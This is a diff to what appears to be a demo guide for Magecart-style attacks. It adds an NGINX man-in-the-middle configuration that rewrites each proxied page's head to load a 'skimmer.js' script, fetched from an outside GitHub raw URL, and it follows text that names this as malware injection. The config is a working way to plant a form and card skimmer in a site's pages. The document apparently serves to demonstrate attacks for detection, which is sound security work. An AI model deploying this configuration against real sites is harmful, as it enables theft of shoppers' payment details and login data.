@@ -76,6 +76,53 @@ Man In the Middle
 - If DNS domain is spoofed, rewrite SNI and headers (HOST, ORIGIN and eventually others required by the App)
 - Inject malware JS `skimmer.js <https://github.com/nergalex/f5-magecart/blob/master/skimmer.js>`_ in all or specific pages
 
+NGINX configuration for JS insertion and redirection:
+
+
+.. code-block:: bash
+
+    user  nginx;
+    worker_processes  auto;
+    error_log  /var/log/nginx/error.log info;
+    pid        /var/run/nginx.pid;
+
+    events {
+        worker_connections 4096;
+    }
+
+    http {
+        log_format main '$remote_addr - $remote_user [$time_local] "$request" $status '
+                            '$body_bytes_sent "$http_referer" "$http_user_agent" "$http_x_forwarded_for" '
+                            '$request_time "$upstream_connect_time" "$upstream_response_time" ';
+
+        access_log /var/log/nginx/access.log main;
+
+        client_max_body_size 1000M;
+        server {
+            listen       80  default_server;
+            resolver 100.127.192.10; # For DNS lookup of $host;
+            location = / {
+                ### Insert malicious JS link in main page
+                gzip on;
+                proxy_set_header Accept-Encoding "";
+                sub_filter "<head>" "<head><script async defer src='https://$host/demo/skimmer.js'></script> ";
+                proxy_set_header Host $host;
+                proxy_pass http://$host;
+            }
+            location = /demo/skimmer.js {
+                # Proxy GET of malicious JS to remote repo
+                proxy_pass https://raw.githubusercontent.com/nergalex/f5-magecart/master/example/skimmer_juiceshop.js;
+                proxy_hide_header Content-Type;
+                add_header Content-Type "application/javascript";
+            }
+            location / {
+                # Other traffic forwarded to origin server
+                proxy_set_header Host $host;
+                proxy_pass http://$host;
+            }
+        }
+    }
+
 BIG-IP UI configuration for JS insertion:
 
     Local Traffic  ››  Profiles : Content : HTML : Rules /Common/form_grabber
